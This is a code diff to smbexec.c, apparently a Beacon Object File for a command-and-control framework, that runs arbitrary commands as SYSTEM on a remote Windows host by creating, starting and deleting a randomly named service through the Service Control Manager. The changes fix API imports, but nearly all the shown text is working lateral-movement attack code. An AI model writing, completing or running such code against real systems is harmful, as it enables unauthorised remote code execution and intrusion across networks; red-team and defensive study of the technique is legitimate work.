@@ -2,8 +2,8 @@
  * smbexec.c — Remote command execution via SCM (Service Control Manager)
  *
  * Flow:
- *   OpenSCManagerW(target) → CreateServiceW(svcName, binPath=command) →
- *   StartServiceW → DeleteService → CloseServiceHandle
+ *   OpenSCManagerW(target) -> CreateServiceW(svcName, binPath=command) ->
+ *   StartServiceW -> DeleteService -> CloseServiceHandle
  *
  * The command is set as the service binary path, so it executes as SYSTEM
  * when the service starts. The service will fail (since the command isn't
@@ -19,6 +19,10 @@ DECLSPEC_IMPORT SC_HANDLE WINAPI ADVAPI32$CreateServiceW(
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$StartServiceW(SC_HANDLE, DWORD, LPCWSTR*);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$DeleteService(SC_HANDLE);
 DECLSPEC_IMPORT BOOL WINAPI ADVAPI32$CloseServiceHandle(SC_HANDLE);
+
+DECLSPEC_IMPORT int  WINAPI KERNEL32$MultiByteToWideChar(UINT, DWORD, LPCCH, int, LPWSTR, int);
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);
+DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetTickCount(void);
 
 DECLSPEC_IMPORT int __cdecl MSVCRT$rand(void);
 DECLSPEC_IMPORT void __cdecl MSVCRT$srand(unsigned int);
@@ -39,21 +43,21 @@ void go(char *args, int args_len) {
 
     /* Convert target to wide */
     wchar_t wTarget[256] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
+    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, target, -1, wTarget, 256);
 
     /* Convert command to wide */
     wchar_t wCommand[4096] = {0};
     /* Wrap command: %COMSPEC% /C "command" */
     wchar_t wCmd[2048] = {0};
-    MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
+    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, command, -1, wCmd, 2048);
     MSVCRT$swprintf(wCommand, 4096, L"%%COMSPEC%% /C \"%s\"", wCmd);
 
     /* Generate or use service name */
     wchar_t wSvcName[64] = {0};
     if (servicename && *servicename) {
-        MultiByteToWideChar(CP_UTF8, 0, servicename, -1, wSvcName, 64);
+        KERNEL32$MultiByteToWideChar(CP_UTF8, 0, servicename, -1, wSvcName, 64);
     } else {
-        MSVCRT$srand((unsigned int)GetTickCount());
+        MSVCRT$srand((unsigned int)KERNEL32$GetTickCount());
         MSVCRT$swprintf(wSvcName, 64, L"svc_%04x%04x",
             MSVCRT$rand() & 0xFFFF, MSVCRT$rand() & 0xFFFF);
     }
@@ -64,7 +68,7 @@ void go(char *args, int args_len) {
     /* Open remote SCM */
     SC_HANDLE hSCM = ADVAPI32$OpenSCManagerW(wTarget, NULL, SC_MANAGER_ALL_ACCESS);
     if (!hSCM) {
-        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "[!] OpenSCManagerW failed: %lu\n", KERNEL32$GetLastError());
         return;
     }
 
@@ -81,7 +85,7 @@ void go(char *args, int args_len) {
         NULL, NULL, NULL, NULL, NULL);
 
     if (!hSvc) {
-        DWORD err = GetLastError();
+        DWORD err = KERNEL32$GetLastError();
         BeaconPrintf(CALLBACK_ERROR, "[!] CreateServiceW failed: %lu\n", err);
         ADVAPI32$CloseServiceHandle(hSCM);
         return;
@@ -92,7 +96,7 @@ void go(char *args, int args_len) {
     /* Start service — this executes the command */
     BOOL started = ADVAPI32$StartServiceW(hSvc, 0, NULL);
     if (!started) {
-        DWORD err = GetLastError();
+        DWORD err = KERNEL32$GetLastError();
         /* ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected — the command isn't a real service */
         if (err == 1053) {
             BeaconPrintf(CALLBACK_OUTPUT, "[+] Command executed (service timed out as expected)\n");
@@ -108,7 +112,7 @@ void go(char *args, int args_len) {
         BeaconPrintf(CALLBACK_OUTPUT, "[+] Service deleted\n");
     } else {
         BeaconPrintf(CALLBACK_ERROR, "[!] DeleteService failed: %lu (manual cleanup needed)\n",
-                     GetLastError());
+                     KERNEL32$GetLastError());
     }
 
     ADVAPI32$CloseServiceHandle(hSvc);
